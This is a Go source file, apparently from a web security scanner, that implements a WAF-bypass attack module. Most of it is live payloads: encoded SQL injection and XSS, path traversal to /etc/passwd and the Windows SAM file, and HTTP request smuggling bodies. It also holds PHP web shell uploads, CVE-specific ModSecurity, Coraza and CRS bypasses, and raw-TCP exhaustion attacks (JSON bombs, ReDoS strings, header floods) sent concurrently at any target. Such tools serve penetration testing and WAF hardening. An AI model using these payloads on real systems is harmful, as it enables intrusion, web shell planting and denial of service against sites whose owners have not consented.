// Package attacks provides the WAF bypass module: encoding tricks, HTTP request
// smuggling, parser confusion, CVE-specific payloads, and resource exhaustion
// attacks designed to bypass Web Application Firewalls.
package attacks

import (
	"context"
	"fmt"
	"net"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/glitchWebServer/internal/scanner"
)

// WAFModule generates attack requests targeting WAF bypass techniques:
// encoding evasion, request smuggling, parser confusion, CVE-specific
// payloads, and resource exhaustion.
type WAFModule struct{}

func (m *WAFModule) Name() string     { return "waf" }
func (m *WAFModule) Category() string { return "waf-bypass" }

func (m *WAFModule) GenerateRequests(target string) []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	reqs = append(reqs, m.encodingBypass()...)
	reqs = append(reqs, m.smuggling()...)
	reqs = append(reqs, m.parserConfusion()...)
	reqs = append(reqs, m.cvePayloads()...)

	return reqs
}

// ---------------------------------------------------------------------------
// RunRawTCP — resource exhaustion attacks that bypass net/http
// ---------------------------------------------------------------------------

func (m *WAFModule) RunRawTCP(ctx context.Context, target string, concurrency int, timeout time.Duration) []scanner.Finding {
	if concurrency <= 0 {
		concurrency = 10
	}
	if timeout <= 0 {
		timeout = 30 * time.Second
	}

	parsed, err := url.Parse(target)
	if err != nil {
		return nil
	}
	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}
	hostname := parsed.Hostname()

	attacks := wafExhaustionAttacks(hostname)

	var (
		findings []scanner.Finding
		mu       sync.Mutex
		wg       sync.WaitGroup
		sem      = make(chan struct{}, concurrency)
	)

	for _, atk := range attacks {
		if ctx.Err() != nil {
			break
		}

		atk := atk
		sem <- struct{}{}
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			finding := executeWAFAttack(ctx, host, atk, timeout)
			if finding != nil {
				mu.Lock()
				findings = append(findings, *finding)
				mu.Unlock()
			}
		}()
	}

	wg.Wait()
	return findings
}

// ---------------------------------------------------------------------------
// Encoding Bypass Payloads
// ---------------------------------------------------------------------------

func (m *WAFModule) encodingBypass() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Base payloads to encode
	sqliPayloads := []string{
		"' OR 1=1--",
		"1 UNION SELECT * FROM users--",
		"'; DROP TABLE users;--",
	}
	xssPayloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
	}

	paths := []string{"/search", "/api/v1/users", "/vuln/a03/search", "/login"}

	// Double URL encoding
	for _, payload := range sqliPayloads {
		encoded := doubleURLEncodeWAF(payload)
		for _, path := range paths {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "GET",
				Path:        fmt.Sprintf("%s?q=%s", path, encoded),
				Headers:     map[string]string{},
				Category:    "WAF-Bypass",
				SubCategory: "encoding-double-url",
				Description: fmt.Sprintf("Double URL encoded SQLi on %s: %s", path, payload),
			})
		}
	}

	// Unicode encoding (%uXXXX IIS-style)
	for _, payload := range xssPayloads {
		encoded := iisUnicodeEncodeWAF(payload)
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        fmt.Sprintf("/search?q=%s", encoded),
			Headers:     map[string]string{},
			Category:    "WAF-Bypass",
			SubCategory: "encoding-unicode",
			Description: fmt.Sprintf("IIS Unicode encoded XSS: %s", payload),
		})
	}

	// Overlong UTF-8 sequences (%C0%AF for /)
	overlongPaths := []struct {
		path string
		desc string
	}{
		{"/%C0%AF..%C0%AF..%C0%AFetc/passwd", "Overlong UTF-8 slash path traversal"},
		{"/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd", "Overlong UTF-8 dot path traversal"},
		{"/..%C0%AF..%C0%AFwindows/system32/config/sam", "Overlong UTF-8 Windows traversal"},
		{"/%E0%80%AF../%E0%80%AF../etc/passwd", "3-byte overlong UTF-8 slash traversal"},
	}
	for _, op := range overlongPaths {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        op.path,
			Headers:     map[string]string{},
			Category:    "WAF-Bypass",
			SubCategory: "encoding-overlong-utf8",
			Description: op.desc,
		})
	}

	// HTML entity encoding with leading zeros (&#0000060; for <) — targets CVE-2025-27110
	htmlEntityPayloads := []struct {
		payload string
		desc    string
	}{
		{"&#0000060;script&#0000062;alert(1)&#0000060;/script&#0000062;", "Leading zeros HTML entity XSS"},
		{"&#00000060;img src=x onerror=alert(1)&#00000062;", "Extra leading zeros HTML entity img XSS"},
		{"&#060;script&#062;alert(document.cookie)&#060;/script&#062;", "Short HTML entity XSS"},
		{"&#0000039; OR 1=1--", "HTML entity encoded quote SQLi"},
	}
	for _, he := range htmlEntityPayloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        fmt.Sprintf("/search?q=%s", url.QueryEscape(he.payload)),
			Headers:     map[string]string{},
			Category:    "WAF-Bypass",
			SubCategory: "encoding-html-entity-zeros",
			Description: he.desc,
		})
	}

	// UTF-7 encoded XSS
	utf7Payloads := []struct {
		payload string
		desc    string
	}{
		{"+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "UTF-7 XSS script tag"},
		{"+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-", "UTF-7 XSS img tag"},
		{"+ADw-svg onload+AD0-alert(1)+AD4-", "UTF-7 XSS svg tag"},
	}
	for _, u7 := range utf7Payloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        fmt.Sprintf("/search?q=%s", url.QueryEscape(u7.payload)),
			Headers:     map[string]string{"Content-Type": "text/html; charset=utf-7"},
			Category:    "WAF-Bypass",
			SubCategory: "encoding-utf7",
			Description: u7.desc,
		})
	}

	// IBM037 EBCDIC encoded SQL
	ibm037Payloads := []struct {
		payload string
		desc    string
	}{
		{"\xc7\xd6\xd9\x40\xf1\x7e\xf1\x60\x60", "IBM037 OR 1=1-- SQLi"},
		{"\xe2\xc5\xd3\xc5\xc3\xe3\x40\x5c\x40\xc6\xd9\xd6\xd4", "IBM037 SELECT * FROM SQLi"},
	}
	for _, ibm := range ibm037Payloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method:   "POST",
			Path:     "/api/v1/users",
			Headers:  map[string]string{"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
			Body:     fmt.Sprintf("username=%s", ibm.payload),
			BodyType: "application/x-www-form-urlencoded; charset=ibm037",
			Category:    "WAF-Bypass",
			SubCategory: "encoding-ibm037",
			Description: ibm.desc,
		})
	}

	// Shift_JIS charset confusion
	shiftJISPayloads := []struct {
		body string
		desc string
	}{
		{"username=\x82\x27 OR 1=1--", "Shift_JIS trail byte quote SQLi"},
		{"search=\x95\x5c<script>alert(1)</script>", "Shift_JIS backslash escape XSS"},
	}
	for _, sj := range shiftJISPayloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/search",
			Headers:     map[string]string{"Content-Type": "application/x-www-form-urlencoded; charset=shift_jis"},
			Body:        sj.body,
			BodyType:    "application/x-www-form-urlencoded; charset=shift_jis",
			Category:    "WAF-Bypass",
			SubCategory: "encoding-shiftjis",
			Description: sj.desc,
		})
	}

	// Mixed charset Content-Type headers
	mixedCharsetPayloads := []struct {
		ct   string
		body string
		desc string
	}{
		{"text/html; charset=utf-8; charset=utf-7", "+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "Mixed charset utf-8/utf-7 XSS"},
		{"application/x-www-form-urlencoded; charset=utf-8; charset=ibm037", "q=' OR 1=1--", "Mixed charset utf-8/ibm037 SQLi"},
		{"text/html; charset=iso-8859-1; charset=utf-7", "+ADw-img src=x onerror=alert(1)+AD4-", "Mixed charset iso-8859-1/utf-7"},
	}
	for _, mc := range mixedCharsetPayloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/search",
			Headers:     map[string]string{"Content-Type": mc.ct},
			Body:        mc.body,
			BodyType:    mc.ct,
			Category:    "WAF-Bypass",
			SubCategory: "encoding-mixed-charset",
			Description: mc.desc,
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// HTTP Request Smuggling
// ---------------------------------------------------------------------------

func (m *WAFModule) smuggling() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// CL.TE desync — Content-Length processed by frontend, Transfer-Encoding by backend
	cltePayloads := []struct {
		cl   string
		body string
		desc string
	}{
		{"6", "0\r\n\r\nX", "CL.TE basic desync"},
		{"13", "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n", "CL.TE smuggle GET /admin"},
		{"5", "0\r\n\r\n", "CL.TE zero chunk with extra CL"},
		{"11", "0\r\n\r\nPOST /login HTTP/1.1\r\nHost: evil\r\nContent-Length: 100\r\n\r\nusername=admin&password=admin", "CL.TE smuggle POST /login"},
	}
	for _, p := range cltePayloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "POST",
			Path:   "/",
			Headers: map[string]string{
				"Content-Length":    p.cl,
				"Transfer-Encoding": "chunked",
			},
			Body:        p.body,
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "WAF-Bypass",
			SubCategory: "smuggling-cl-te",
			Description: p.desc,
		})
	}

	// TE.CL desync — Transfer-Encoding processed by frontend, Content-Length by backend
	teclPayloads := []struct {
		cl   string
		body string
		desc string
	}{
		{"3", "8\r\nSMUGGLED\r\n0\r\n\r\n", "TE.CL basic desync"},
		{"4", "5c\r\nGPOST /admin HTTP/1.1\r\nHost: evil\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n", "TE.CL smuggle POST /admin"},
	}
	for _, p := range teclPayloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "POST",
			Path:   "/",
			Headers: map[string]string{
				"Content-Length":    p.cl,
				"Transfer-Encoding": "chunked",
			},
			Body:        p.body,
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "WAF-Bypass",
			SubCategory: "smuggling-te-cl",
			Description: p.desc,
		})
	}

	// TE.TE obfuscation — malformed Transfer-Encoding values
	teObfuscations := []struct {
		te   string
		desc string
	}{
		{"xchunked", "Non-standard prefix xchunked"},
		{"\tchunked", "Tab-prefixed chunked"},
		{"chunked\x00", "Null-terminated chunked"},
		{"CHUNKED", "Uppercase CHUNKED"},
		{" chunked", "Space-prefixed chunked"},
		{"chunked ", "Trailing space chunked"},
		{"chunked\r\nTransfer-Encoding: identity", "Double TE header chunked+identity"},
		{"identity\r\nTransfer-Encoding: chunked", "Double TE header identity+chunked"},
	}
	for _, o := range teObfuscations {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "POST",
			Path:   "/",
			Headers: map[string]string{
				"Transfer-Encoding": o.te,
				"Content-Length":    "5",
			},
			Body:        "0\r\n\r\n",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "WAF-Bypass",
			SubCategory: "smuggling-te-te",
			Description: fmt.Sprintf("TE.TE obfuscation: %s", o.desc),
		})
	}

	// Double Content-Length headers
	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Content-Length":                        "0",
			"Content-Length\r\nContent-Length":       "50",
		},
		Body:        "GET /admin HTTP/1.1\r\nHost: evil\r\n\r\n",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "WAF-Bypass",
		SubCategory: "smuggling-double-cl",
		Description: "Double Content-Length: 0 and 50",
	})

	// Chunked transfer with payload split across chunk boundaries
	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/search",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Body:        "1\r\n'\r\n7\r\n OR 1=1\r\n2\r\n--\r\n0\r\n\r\n",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "WAF-Bypass",
		SubCategory: "smuggling-chunk-split",
		Description: "Chunked SQLi split across chunk boundaries",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/search",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Body:        "3\r\n<sc\r\n4\r\nript\r\n1\r\n>\r\na\r\nalert(1)</\r\n7\r\nscript>\r\n0\r\n\r\n",
		BodyType:    "text/html",
		Category:    "WAF-Bypass",
		SubCategory: "smuggling-chunk-split",
		Description: "Chunked XSS split across chunk boundaries",
	})

	// Chunked extensions (bare semicolons)
	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Body:        "5;ext=val\r\nhello\r\n0;\r\n\r\n",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "WAF-Bypass",
		SubCategory: "smuggling-chunk-ext",
		Description: "Chunked extensions with bare semicolons",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Body:        "5;;;;;;\r\nhello\r\n0;\r\n\r\n",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "WAF-Bypass",
		SubCategory: "smuggling-chunk-ext",
		Description: "Multiple bare semicolons in chunk extension",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Parser Confusion
// ---------------------------------------------------------------------------

func (m *WAFModule) parserConfusion() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Malformed multipart boundaries
	multipartPayloads := []struct {
		ct   string
		body string
		desc string
	}{
		{
			"multipart/form-data; boundary=----BOUNDARY",
			"------BOUNDARY\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------BOUNDARY--",
			"Standard multipart file upload with PHP shell",
		},
		{
			"multipart/form-data; boundary=----BOUNDARY",
			"------BOUNDARY\nContent-Disposition: form-data; name=\"q\"\n\n' OR 1=1--\n------BOUNDARY--",
			"Multipart with LF-only (missing CR)",
		},
		{
			"multipart/form-data; boundary=outer",
			"--outer\r\nContent-Type: multipart/form-data; boundary=inner\r\n\r\n--inner\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n<script>alert(1)</script>\r\n--inner--\r\n--outer--",
			"Nested multipart boundaries",
		},
		{
			"multipart/form-data; boundary=",
			"--\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\ntest\r\n----",
			"Empty multipart boundary",
		},
	}
	for _, mp := range multipartPayloads {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/api/v1/upload",
			Headers:     map[string]string{"Content-Type": mp.ct},
			Body:        mp.body,
			BodyType:    mp.ct,
			Category:    "WAF-Bypass",
			SubCategory: "parser-multipart",
			Description: mp.desc,
		})
	}

	// Content-Type switching — send SQLi via application/json instead of form-data
	jsonSQLi := []struct {
		body string
		desc string
	}{
		{`{"username":"' OR 1=1--","password":"test"}`, "SQLi in JSON body"},
		{`{"search":"<script>alert(1)</script>"}`, "XSS in JSON body"},
		{`{"id":"1; DROP TABLE users;--"}`, "SQL DROP in JSON body"},
	}
	for _, js := range jsonSQLi {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/api/v1/users",
			Headers:     map[string]string{},
			Body:        js.body,
			BodyType:    "application/json",
			Category:    "WAF-Bypass",
			SubCategory: "parser-content-type-switch",
			Description: js.desc,
		})
	}

	// Ambiguous Content-Type
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "POST",
		Path:        "/api/v1/users",
		Headers:     map[string]string{"Content-Type": "text/plain; application/json"},
		Body:        `{"q":"' OR 1=1--"}`,
		BodyType:    "text/plain; application/json",
		Category:    "WAF-Bypass",
		SubCategory: "parser-ambiguous-ct",
		Description: "Ambiguous Content-Type: text/plain mixed with application/json",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method:      "POST",
		Path:        "/api/v1/users",
		Headers:     map[string]string{"Content-Type": "application/xml; application/json"},
		Body:        `{"q":"<script>alert(1)</script>"}`,
		BodyType:    "application/xml; application/json",
		Category:    "WAF-Bypass",
		SubCategory: "parser-ambiguous-ct",
		Description: "Ambiguous Content-Type: xml mixed with json",
	})

	// URL path confusion — targets CVE-2025-29914
	pathConfusions := []struct {
		path string
		desc string
	}{
		{"//admin", "Double-slash prefix path confusion"},
		{"///admin/config", "Triple-slash prefix path confusion"},
		{"/./admin", "Dot-slash path confusion"},
		{"/%2e%2e/admin", "Encoded dot-dot path traversal"},
		{"/%2e/admin", "Encoded single dot path confusion"},
		{"/admin/.", "Trailing dot path confusion"},
		{"/admin/..", "Trailing dot-dot path confusion"},
		{"/admin%00", "Null byte path termination"},
		{"/admin;.js", "Semicolon path extension confusion"},
		{"//localhost/admin", "Double-slash with host path confusion"},
	}
	for _, pc := range pathConfusions {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        pc.path,
			Headers:     map[string]string{},
			Category:    "WAF-Bypass",
			SubCategory: "parser-path-confusion",
			Description: fmt.Sprintf("Path confusion: %s", pc.desc),
		})
	}

	// HTTP method override headers
	overrideHeaders := []string{
		"X-HTTP-Method-Override",
		"X-Method-Override",
		"X-HTTP-Method",
		"_method",
	}
	for _, header := range overrideHeaders {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/admin",
			Headers:     map[string]string{header: "DELETE"},
			Category:    "WAF-Bypass",
			SubCategory: "parser-method-override",
			Description: fmt.Sprintf("Method override via %s: DELETE", header),
		})
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        "/api/v1/users/1",
			Headers:     map[string]string{header: "PUT"},
			Body:        `{"role":"admin"}`,
			BodyType:    "application/json",
			Category:    "WAF-Bypass",
			SubCategory: "parser-method-override",
			Description: fmt.Sprintf("Method override via %s: PUT with body", header),
		})
	}

	// HTTP parameter pollution
	paramPollution := []struct {
		path string
		desc string
	}{
		{"/api/v1/users?id=1&id=OR+1%3D1", "HPP SQLi: duplicate id param"},
		{"/search?q=safe&q=<script>alert(1)</script>", "HPP XSS: duplicate q param"},
		{"/login?redirect=/home&redirect=//evil.com", "HPP open redirect: duplicate redirect param"},
		{"/api/v1/users?role=user&role=admin", "HPP privilege escalation: duplicate role param"},
	}
	for _, pp := range paramPollution {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        pp.path,
			Headers:     map[string]string{},
			Category:    "WAF-Bypass",
			SubCategory: "parser-param-pollution",
			Description: pp.desc,
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// CVE-Specific Payloads
// ---------------------------------------------------------------------------

func (m *WAFModule) cvePayloads() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// CVE-2024-1019: ModSecurity URL path bypass (percent-decode before path split)
	cve2024_1019 := []struct {
		path string
		desc string
	}{
		{"/admin%3Fbypass=1", "CVE-2024-1019: ModSecurity encoded ? in path"},
		{"/%61%64%6d%69%6e", "CVE-2024-1019: ModSecurity fully encoded /admin"},
		{"/admin%23fragment", "CVE-2024-1019: ModSecurity encoded # in path"},
		{"/allowed%2F..%2Fadmin", "CVE-2024-1019: ModSecurity encoded slash traversal"},
	}
	for _, cve := range cve2024_1019 {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        cve.path,
			Headers:     map[string]string{},
			Category:    "WAF-Bypass",
			SubCategory: "cve-2024-1019",
			Description: cve.desc,
		})
	}

	// CVE-2025-29914: Coraza //prefix URI confusion
	cve2025_29914 := []struct {
		path string
		desc string
	}{
		{"//admin", "CVE-2025-29914: Coraza double-slash /admin"},
		{"//api/v1/users", "CVE-2025-29914: Coraza double-slash /api"},
		{"///admin///config", "CVE-2025-29914: Coraza triple-slash confusion"},
		{"//localhost/admin", "CVE-2025-29914: Coraza authority-form URI"},
	}
	for _, cve := range cve2025_29914 {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        cve.path,
			Headers:     map[string]string{},
			Category:    "WAF-Bypass",
			SubCategory: "cve-2025-29914",
			Description: cve.desc,
		})
	}

	// CVE-2026-21876: CRS charset=utf-7 XSS bypass
	cve2026_21876 := []struct {
		ct   string
		body string
		desc string
	}{
		{
			"text/html; charset=utf-7",
			"+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-",
			"CVE-2026-21876: CRS UTF-7 XSS bypass (script)",
		},
		{
			"text/html; charset=utf-7",
			"+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-",
			"CVE-2026-21876: CRS UTF-7 XSS bypass (img onerror)",
		},
		{
			"text/html; charset=UTF-7",
			"+ADw-svg/onload+AD0-alert(1)+AD4-",
			"CVE-2026-21876: CRS UTF-7 XSS bypass (svg uppercase charset)",
		},
	}
	for _, cve := range cve2026_21876 {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/search",
			Headers:     map[string]string{"Content-Type": cve.ct},
			Body:        cve.body,
			BodyType:    cve.ct,
			Category:    "WAF-Bypass",
			SubCategory: "cve-2026-21876",
			Description: cve.desc,
		})
	}

	// CVE-2022-48279: ModSecurity multipart parsing bypass
	cve2022_48279 := []struct {
		ct   string
		body string
		desc string
	}{
		{
			"multipart/form-data; boundary=----WebKitFormBoundary",
			"------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['c']); ?>\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"safe.txt\"\r\nContent-Type: text/plain\r\n\r\nsafe content\r\n------WebKitFormBoundary--",
			"CVE-2022-48279: ModSecurity multipart duplicate filename",
		},
		{
			"multipart/form-data; boundary=X; boundary=Y",
			"--Y\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n' OR 1=1--\r\n--Y--",
			"CVE-2022-48279: ModSecurity duplicate boundary params",
		},
	}
	for _, cve := range cve2022_48279 {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/api/v1/upload",
			Headers:     map[string]string{"Content-Type": cve.ct},
			Body:        cve.body,
			BodyType:    cve.ct,
			Category:    "WAF-Bypass",
			SubCategory: "cve-2022-48279",
			Description: cve.desc,
		})
	}

	// CVE-2023-24021: Null byte in file upload
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "POST",
		Path:        "/api/v1/upload",
		Headers:     map[string]string{"Content-Type": "multipart/form-data; boundary=----Boundary"},
		Body:        "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\x00.txt\"\r\nContent-Type: text/plain\r\n\r\n<?php system($_GET['c']); ?>\r\n------Boundary--",
		BodyType:    "multipart/form-data; boundary=----Boundary",
		Category:    "WAF-Bypass",
		SubCategory: "cve-2023-24021",
		Description: "CVE-2023-24021: Null byte in upload filename (shell.php\\x00.txt)",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method:      "POST",
		Path:        "/api/v1/upload",
		Headers:     map[string]string{"Content-Type": "multipart/form-data; boundary=----Boundary"},
		Body:        "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\nContent-Type: application/octet-stream\x00text/plain\r\n\r\nmalicious content\r\n------Boundary--",
		BodyType:    "multipart/form-data; boundary=----Boundary",
		Category:    "WAF-Bypass",
		SubCategory: "cve-2023-24021",
		Description: "CVE-2023-24021: Null byte in Content-Type header of multipart",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Resource Exhaustion Attacks (raw TCP)
// ---------------------------------------------------------------------------

type wafAttack struct {
	name        string
	category    string
	description string
	severity    string
	payload     func(host string) []byte
	readTimeout time.Duration
}

func wafExhaustionAttacks(hostname string) []wafAttack {
	var attacks []wafAttack

	// Nested JSON bomb
	deepJSON := strings.Repeat(`{"a":`, 3000) + `"x"` + strings.Repeat(`}`, 3000)
	attacks = append(attacks, wafAttack{
		name:        "json-depth-bomb",
		category:    "exhaustion-json",
		description: "Nested JSON bomb: 3000 levels deep to exhaust WAF parser",
		severity:    "high",
		payload: func(host string) []byte {
			return []byte(fmt.Sprintf(
				"POST /api/v1/users HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s",
				host, len(deepJSON), deepJSON,
			))
		},
		readTimeout: 10 * time.Second,
	})

	// Wider JSON bomb (many keys)
	var wideJSON strings.Builder
	wideJSON.WriteString("{")
	for i := 0; i < 10000; i++ {
		if i > 0 {
			wideJSON.WriteString(",")
		}
		fmt.Fprintf(&wideJSON, `"k%d":"v%d"`, i, i)
	}
	wideJSON.WriteString("}")
	wideJSONStr := wideJSON.String()
	attacks = append(attacks, wafAttack{
		name:        "json-width-bomb",
		category:    "exhaustion-json",
		description: "Wide JSON bomb: 10000 keys to exhaust WAF rule matching",
		severity:    "medium",
		payload: func(host string) []byte {
			return []byte(fmt.Sprintf(
				"POST /api/v1/users HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s",
				host, len(wideJSONStr), wideJSONStr,
			))
		},
		readTimeout: 10 * time.Second,
	})

	// ReDoS payloads (catastrophic regex backtracking for CRS rules)
	redosPayloads := []struct {
		payload string
		desc    string
	}{
		{strings.Repeat("a", 50000), "ReDoS: 50K 'a' chars for CRS rule backtracking"},
		{"q=" + strings.Repeat("\\", 5000), "ReDoS: 5K backslashes for escape-sequence rules"},
		{"q=" + strings.Repeat("'", 10000), "ReDoS: 10K single quotes for SQLi rule backtracking"},
		{"q=" + strings.Repeat("(", 5000) + strings.Repeat(")", 5000), "ReDoS: 5K nested parens for expression rules"},
	}
	for _, r := range redosPayloads {
		body := r.payload
		attacks = append(attacks, wafAttack{
			name:        "redos",
			category:    "exhaustion-redos",
			description: r.desc,
			severity:    "high",
			payload: func(host string) []byte {
				return []byte(fmt.Sprintf(
					"POST /search HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s",
					host, len(body), body,
				))
			},
			readTimeout: 15 * time.Second,
		})
	}

	// Large header flood (many headers near WAF limits)
	var headerFlood strings.Builder
	fmt.Fprintf(&headerFlood, "GET / HTTP/1.1\r\nHost: %s\r\n", hostname)
	for i := 0; i < 500; i++ {
		fmt.Fprintf(&headerFlood, "X-Custom-Header-%d: %s\r\n", i, strings.Repeat("A", 128))
	}
	headerFlood.WriteString("\r\n")
	headerFloodStr := headerFlood.String()
	attacks = append(attacks, wafAttack{
		name:        "header-flood",
		category:    "exhaustion-headers",
		description: "Large header flood: 500 custom headers to exhaust WAF header parsing",
		severity:    "medium",
		payload: func(host string) []byte {
			return []byte(headerFloodStr)
		},
		readTimeout: 10 * time.Second,
	})

	// WebSocket upgrade flood
	attacks = append(attacks, wafAttack{
		name:        "websocket-upgrade-flood",
		category:    "exhaustion-websocket",
		description: "WebSocket upgrade flood: rapid upgrade requests to exhaust WAF connection tracking",
		severity:    "medium",
		payload: func(host string) []byte {
			return []byte(fmt.Sprintf(
				"GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\nOrigin: http://%s\r\n\r\n",
				host, host,
			))
		},
		readTimeout: 5 * time.Second,
	})

	return attacks
}

func executeWAFAttack(ctx context.Context, host string, atk wafAttack, timeout time.Duration) *scanner.Finding {
	dialer := net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", host)
	if err != nil {
		return nil
	}
	defer conn.Close()

	hostname := host
	if idx := strings.LastIndex(host, ":"); idx >= 0 {
		hostname = host[:idx]
	}

	payload := atk.payload(hostname)

	if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
		return nil
	}
	if _, err := conn.Write(payload); err != nil {
		return nil
	}

	readTimeout := atk.readTimeout
	if readTimeout <= 0 {
		readTimeout = 10 * time.Second
	}
	if err := conn.SetReadDeadline(time.Now().Add(readTimeout)); err != nil {
		return nil
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)

	// Timeout on resource exhaustion payloads is a finding
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return &scanner.Finding{
				Category:    "waf-bypass-" + atk.category,
				Severity:    atk.severity,
				URL:         "tcp://" + host,
				Method:      "RAW-TCP",
				StatusCode:  0,
				Evidence:    fmt.Sprintf("Timeout after %v: %s", readTimeout, atk.description),
				Description: atk.description,
			}
		}
		return nil
	}

	response := string(buf[:n])

	// Check for 500 errors indicating WAF crash
	if strings.Contains(response, "500 ") || strings.Contains(response, "502 ") || strings.Contains(response, "503 ") {
		return &scanner.Finding{
			Category:    "waf-bypass-" + atk.category,
			Severity:    atk.severity,
			URL:         "tcp://" + host,
			Method:      "RAW-TCP",
			StatusCode:  500,
			Evidence:    fmt.Sprintf("Server error response: %.200s", response),
			Description: atk.description,
		}
	}

	return nil
}

// ---------------------------------------------------------------------------
// Helper encoding functions
// ---------------------------------------------------------------------------

func doubleURLEncodeWAF(s string) string {
	var b strings.Builder
	b.Grow(len(s) * 9)
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			b.WriteByte(c)
		} else {
			// Double encode: e.g., ' becomes %2527
			fmt.Fprintf(&b, "%%25%02X", c)
		}
	}
	return b.String()
}

func iisUnicodeEncodeWAF(s string) string {
	var b strings.Builder
	b.Grow(len(s) * 6)
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
		} else {
			fmt.Fprintf(&b, "%%u%04X", r)
		}
	}
	return b.String()
}
